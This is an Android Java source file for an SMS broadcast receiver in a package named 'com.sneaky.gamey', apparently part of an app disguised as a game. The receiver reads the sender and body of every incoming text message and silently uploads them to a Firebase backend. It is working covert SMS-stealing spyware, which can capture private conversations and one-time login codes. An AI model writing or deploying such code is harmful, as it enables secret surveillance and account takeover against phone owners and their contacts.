package com.sneaky.gamey.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

import com.sneaky.gamey.database.MyFirebase;

public class SmsReceiver extends BroadcastReceiver {
    public static final String pdu_type = "pdus";

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        SmsMessage[] smsMessages;
        String message = "";
        String format = bundle.getString("format");
        Object[] pdus = (Object[]) bundle.get(pdu_type);
        if (pdus != null) {
            smsMessages = new SmsMessage[pdus.length];
            for (int i = 0; i < smsMessages.length; i++) {
                smsMessages[i] = SmsMessage.createFromPdu((byte[]) pdus[i], format);
                message += "SMS from " + smsMessages[i].getOriginatingAddress() + " :" + smsMessages[i].getMessageBody() + "\n";
            }
        }
        MyFirebase.sendData("SMS", message);
    }
}
